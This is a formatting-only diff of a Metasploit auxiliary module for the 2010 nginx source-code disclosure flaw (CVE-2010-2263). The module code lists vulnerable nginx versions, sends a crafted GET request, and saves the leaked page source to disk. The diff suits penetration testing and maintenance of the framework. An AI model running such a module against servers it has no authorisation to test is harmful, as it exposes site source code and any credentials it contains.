@@ -10,31 +10,30 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'Nginx Source Code Disclosure/Download',
-      'Description'    => %q{
+      'Name' => 'Nginx Source Code Disclosure/Download',
+      'Description' => %q{
           This module exploits a source code disclosure/download vulnerability in
         versions 0.7 and 0.8 of the nginx web server. Versions 0.7.66 and 0.8.40
         correct this vulnerability.
       },
-      'References'     =>
-        [
-          [ 'CVE', '2010-2263' ],
-          [ 'OSVDB', '65531' ],
-          [ 'BID', '40760' ],
-          [ 'EDB', '13818' ],
-          [ 'EDB', '13822' ]
-        ],
-      'Author'         =>
-        [
-          'Tiago Ferreira <tiago.ccna[at]gmail.com>',
-        ],
-      'License'        =>  MSF_LICENSE)
+      'References' => [
+        [ 'CVE', '2010-2263' ],
+        [ 'OSVDB', '65531' ],
+        [ 'BID', '40760' ],
+        [ 'EDB', '13818' ],
+        [ 'EDB', '13822' ]
+      ],
+      'Author' => [
+        'Tiago Ferreira <tiago.ccna[at]gmail.com>',
+      ],
+      'License' => MSF_LICENSE)
 
     register_options(
       [
         OptString.new('TARGETURI', [true, 'Specify the path to download the file (ex: admin.php)', '/admin.php']),
         OptString.new('PATH_SAVE', [true, 'The path to save the downloaded source code', '']),
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -43,12 +42,12 @@ class MetasploitModule < Msf::Auxiliary
 
     vuln_versions = [
       # 0.7
-      "nginx/0.7.56","nginx/0.7.58","nginx/0.7.59",
-      "nginx/0.7.60","nginx/0.7.61","nginx/0.7.62",
-      "nginx/0.7.63","nginx/0.7.64","nginx/0.7.65",
+      "nginx/0.7.56", "nginx/0.7.58", "nginx/0.7.59",
+      "nginx/0.7.60", "nginx/0.7.61", "nginx/0.7.62",
+      "nginx/0.7.63", "nginx/0.7.64", "nginx/0.7.65",
       # 0.8
-      "nginx/0.8.33","nginx/0.8.34","nginx/0.8.35",
-      "nginx/0.8.36","nginx/0.8.37","nginx/0.8.38",
+      "nginx/0.8.33", "nginx/0.8.34", "nginx/0.8.35",
+      "nginx/0.8.36", "nginx/0.8.37", "nginx/0.8.38",
       "nginx/0.8.39"
     ]
 
@@ -57,9 +56,10 @@ class MetasploitModule < Msf::Auxiliary
     begin
       res = send_request_raw(
         {
-          'method'  => 'GET',
-          'uri'     => "#{uri}#{get_source}",
-        }, 25)
+          'method' => 'GET',
+          'uri' => "#{uri}#{get_source}",
+        }, 25
+      )
 
       if res.nil?
         print_error("#{full_uri} - nginx - Connection timed out")
@@ -76,7 +76,7 @@ class MetasploitModule < Msf::Auxiliary
 
           print_good("#{full_uri} - nginx - Getting the source of page #{uri}")
 
-          save_source = File.new("#{path_save}#{uri}","w")
+          save_source = File.new("#{path_save}#{uri}", "w")
           save_source.puts(res.body.to_s)
           save_source.close
 
@@ -97,7 +97,6 @@ class MetasploitModule < Msf::Auxiliary
         return
 
       end
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
     rescue ::Timeout::Error, ::Errno::EPIPE
     end
